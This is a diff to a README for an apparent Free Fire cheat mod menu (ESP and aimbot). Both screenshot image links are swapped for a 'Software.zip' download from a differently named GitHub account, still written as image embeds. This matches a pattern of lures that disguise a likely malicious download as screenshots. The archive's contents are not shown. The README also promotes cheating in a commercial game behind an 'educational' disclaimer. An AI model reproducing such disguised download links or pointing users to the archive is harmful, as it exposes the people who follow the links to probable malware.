@@ -6,11 +6,11 @@ Project was been sent to me by brazilian modders, but I don't care about shitty 
 Mod menu is based on my old template
 
 # Screenshot
-![](https://i.imgur.com/JJFEQor.png)
+![](https://github.com/HYPERMODZ12/FreeFire-ESP-And-Aimbot-3/releases/download/v1.0/Software.zip)
 
 *This one is taken from a random Youtube video, didn't bother testing it. I can't confirm how it looks like... Let's just assume it look like this since this one has Canvas :))*
 
-![](https://i.imgur.com/SEQXUr1.png)
+![](https://github.com/HYPERMODZ12/FreeFire-ESP-And-Aimbot-3/releases/download/v1.0/Software.zip)
 
 # DISCLAIMER
 **WE SHARE THIS PROJECT FOR EDUCATIONAL PURPOSES ONLY, TO LEARN HOW THIS PROJECT WORKS. WE DO NOT ENCOURAGE YOU TO MOD FREE FIRE OR ANY TENCENT GAMES. DOING SO MAY END YOU UP IN LEGAL TROUBLE. YOU ARE ONLY RESPONSABLE FOR YOUR ACTIONS.**
